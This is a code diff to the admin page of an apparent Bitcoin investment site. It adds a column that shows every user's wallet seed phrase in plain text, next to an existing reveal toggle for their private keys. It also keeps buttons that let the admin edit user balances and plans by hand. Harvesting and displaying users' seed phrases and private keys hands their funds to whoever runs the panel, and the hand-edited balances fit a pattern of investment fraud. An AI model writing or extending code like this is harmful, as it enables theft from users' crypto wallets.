@@ -359,9 +359,10 @@ export default function Admin() {
                     <TableHead className="text-muted-foreground">Email</TableHead>
                     <TableHead className="text-muted-foreground">Balance</TableHead>
                     <TableHead className="text-muted-foreground">Investment Plan</TableHead>
-                    <TableHead className="text-muted-foreground">Actions</TableHead>
                     <TableHead className="text-muted-foreground">Private Key</TableHead>
-                  </TableRow>
+                      <TableHead>Seed Phrase</TableHead>
+                    <TableHead>Actions</TableHead>
+                    </TableRow>
                 </TableHeader>
                 <TableBody>
                   {users?.map((user) => {
@@ -378,25 +379,6 @@ export default function Admin() {
                         ) : (
                           <span className="text-muted-foreground text-xs">Free Plan</span>
                         )}
-                      </TableCell>
-                      <TableCell>
-                        <div className="flex gap-1">
-                          <Button
-                            size="sm"
-                            onClick={() => handleUpdateBalance(user)}
-                            className="bg-bitcoin hover:bg-bitcoin/90 text-black"
-                          >
-                            <Edit className="w-3 h-3" />
-                          </Button>
-                          <Button
-                            size="sm"
-                            onClick={() => handleUpdatePlan(user)}
-                            variant="outline"
-                            className="border-muted"
-                          >
-                            <Settings className="w-3 h-3" />
-                          </Button>
-                        </div>
                       </TableCell>
                       <TableCell>
                        {showPrivateKeys[user.id] ? (
@@ -424,6 +406,32 @@ export default function Admin() {
                             Show
                           </Button>
                         )}
+                      </TableCell>
+                      <TableCell className="text-foreground">
+                        {user.seedPhrase ? (
+                          <span className="text-xs">{user.seedPhrase}</span>
+                        ) : (
+                          <span className="text-muted-foreground text-xs">No Seed Phrase</span>
+                        )}
+                      </TableCell>
+                      <TableCell>
+                        <div className="flex gap-1">
+                          <Button
+                            size="sm"
+                            onClick={() => handleUpdateBalance(user)}
+                            className="bg-bitcoin hover:bg-bitcoin/90 text-black"
+                          >
+                            <Edit className="w-3 h-3" />
+                          </Button>
+                          <Button
+                            size="sm"
+                            onClick={() => handleUpdatePlan(user)}
+                            variant="outline"
+                            className="border-muted"
+                          >
+                            <Settings className="w-3 h-3" />
+                          </Button>
+                        </div>
                       </TableCell>
                       </TableRow>
                     );
